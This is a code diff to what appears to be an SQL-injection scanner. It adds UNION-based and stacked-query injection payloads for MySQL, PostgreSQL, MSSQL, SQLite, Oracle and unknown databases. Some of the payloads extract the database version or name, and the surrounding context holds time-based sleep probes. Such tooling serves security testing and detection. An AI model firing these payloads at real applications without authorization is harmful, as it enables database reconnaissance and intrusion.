@@ -55,8 +55,13 @@ TECHNIQUE_ERROR = "error"
 TECHNIQUE_BOOLEAN = "boolean"
 #: Sentinel technique name for time-based blind probes.
 TECHNIQUE_TIME = "time"
+#: Sentinel technique name for UNION-based probes.
+TECHNIQUE_UNION = "union"
+#: Sentinel technique name for stacked-query probes.
+TECHNIQUE_STACKED = "stacked"
 
-KNOWN_TECHNIQUES = (TECHNIQUE_ERROR, TECHNIQUE_BOOLEAN, TECHNIQUE_TIME)
+KNOWN_TECHNIQUES = (TECHNIQUE_ERROR, TECHNIQUE_BOOLEAN, TECHNIQUE_TIME,
+                    TECHNIQUE_UNION, TECHNIQUE_STACKED)
 
 
 # ---------------------------------------------------------------------------
@@ -184,6 +189,19 @@ def _mysql_adapter() -> DBAdapter:
                 "'; SELECT SLEEP(5)--",
                 "' AND (SELECT * FROM (SELECT SLEEP(5)) t)--",
             ]),
+            TECHNIQUE_UNION: PayloadFamily.create(DBType.MYSQL, TECHNIQUE_UNION, [
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL--",
+                "' UNION SELECT 1,@@version,3--",
+                "' UNION SELECT 1,database(),3--",
+            ]),
+            TECHNIQUE_STACKED: PayloadFamily.create(DBType.MYSQL, TECHNIQUE_STACKED, [
+                "'; SELECT 1--",
+                "'; SELECT SLEEP(0)--",
+                "1'; SELECT 1; SELECT '1",
+            ]),
         },
         fingerprint_patterns=_compile([
             r"You have an error in your SQL syntax.*MySQL",
@@ -225,6 +243,18 @@ def _postgresql_adapter() -> DBAdapter:
                 "' OR (SELECT pg_sleep(5))--",
                 "1; SELECT pg_sleep(5)--",
                 "'; SELECT 1 FROM pg_sleep(5)--",
+            ]),
+            TECHNIQUE_UNION: PayloadFamily.create(DBType.POSTGRESQL, TECHNIQUE_UNION, [
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT 1,version(),3--",
+                "' UNION SELECT 1,current_database(),3--",
+            ]),
+            TECHNIQUE_STACKED: PayloadFamily.create(DBType.POSTGRESQL, TECHNIQUE_STACKED, [
+                "'; SELECT 1--",
+                "'; SELECT pg_sleep(0)--",
+                "1'; SELECT 1; SELECT '1",
             ]),
         },
         fingerprint_patterns=_compile([
@@ -268,6 +298,18 @@ def _mssql_adapter() -> DBAdapter:
                 "' AND 1=1 WAITFOR DELAY '0:0:5'--",
                 "1; WAITFOR DELAY '0:0:5'--",
             ]),
+            TECHNIQUE_UNION: PayloadFamily.create(DBType.MSSQL, TECHNIQUE_UNION, [
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT 1,@@version,3--",
+                "' UNION SELECT 1,db_name(),3--",
+            ]),
+            TECHNIQUE_STACKED: PayloadFamily.create(DBType.MSSQL, TECHNIQUE_STACKED, [
+                "'; SELECT 1--",
+                "'; WAITFOR DELAY '0:0:0'--",
+                "1'; SELECT 1; SELECT '1",
+            ]),
         },
         fingerprint_patterns=_compile([
             r"Microsoft OLE DB Provider for SQL Server",
@@ -305,6 +347,17 @@ def _sqlite_adapter() -> DBAdapter:
                 "' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master)>0--",
                 "' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b)>0--",
             ]),
+            TECHNIQUE_UNION: PayloadFamily.create(DBType.SQLITE, TECHNIQUE_UNION, [
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT 1,sqlite_version(),3--",
+            ]),
+            TECHNIQUE_STACKED: PayloadFamily.create(DBType.SQLITE, TECHNIQUE_STACKED, [
+                # SQLite supports stacked queries via multi-statement support (driver-dependent)
+                "'; SELECT 1--",
+                "'; SELECT sqlite_version()--",
+            ]),
         },
         fingerprint_patterns=_compile([
             r"SQLite/JDBCDriver",
@@ -341,6 +394,16 @@ def _oracle_adapter() -> DBAdapter:
                 "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--",
                 "'; EXECUTE DBMS_LOCK.SLEEP(5)--",
                 "' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('t',5)=1)--",
+            ]),
+            TECHNIQUE_UNION: PayloadFamily.create(DBType.ORACLE, TECHNIQUE_UNION, [
+                "' UNION SELECT NULL FROM dual--",
+                "' UNION SELECT NULL,NULL FROM dual--",
+                "' UNION SELECT NULL,NULL,NULL FROM dual--",
+                "' UNION SELECT 1,banner,3 FROM v$version WHERE ROWNUM=1--",
+            ]),
+            TECHNIQUE_STACKED: PayloadFamily.create(DBType.ORACLE, TECHNIQUE_STACKED, [
+                # Oracle does not support stacked queries via standard JDBC
+                "'; SELECT 1 FROM dual--",
             ]),
         },
         fingerprint_patterns=_compile([
@@ -381,6 +444,16 @@ def _unknown_adapter() -> DBAdapter:
                 "'; SELECT pg_sleep(5)--",
                 "'; WAITFOR DELAY '0:0:5'--",
                 "' AND DBMS_PIPE.RECEIVE_MESSAGE('t',5)=1--",
+            ]),
+            TECHNIQUE_UNION: PayloadFamily.create(DBType.UNKNOWN, TECHNIQUE_UNION, [
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT NULL,NULL,NULL,NULL--",
+            ]),
+            TECHNIQUE_STACKED: PayloadFamily.create(DBType.UNKNOWN, TECHNIQUE_STACKED, [
+                "'; SELECT 1--",
+                "'; SELECT 1; SELECT '1",
             ]),
         },
         fingerprint_patterns=[],
